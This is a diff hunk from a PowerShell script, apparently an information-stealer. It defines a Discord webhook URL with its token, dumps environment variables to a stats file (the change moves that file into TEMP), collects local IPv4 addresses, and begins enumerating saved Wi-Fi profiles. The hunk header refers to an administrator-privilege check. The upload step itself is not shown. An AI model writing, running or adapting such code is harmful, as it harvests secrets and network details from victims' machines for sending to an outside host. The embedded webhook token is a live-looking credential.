@@ -8,7 +8,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 $url = "https://discord.com/api/webhooks/1041694504509513849/MjNgj3FYhmCtuOKJmuCyLy2_bOO38Tv3lyklW6KlnIUOms6fGb6gZzKVpEbSsNUdKovI"
 
 # Récupérer les informations réseau et Wi-Fi
-dir env: >> stats.txt
+dir env: >> "$env:TEMP\stats.txt"
 Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' } >> stats.txt
 (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
     $name = $_.Matches.Groups[1].Value.Trim()
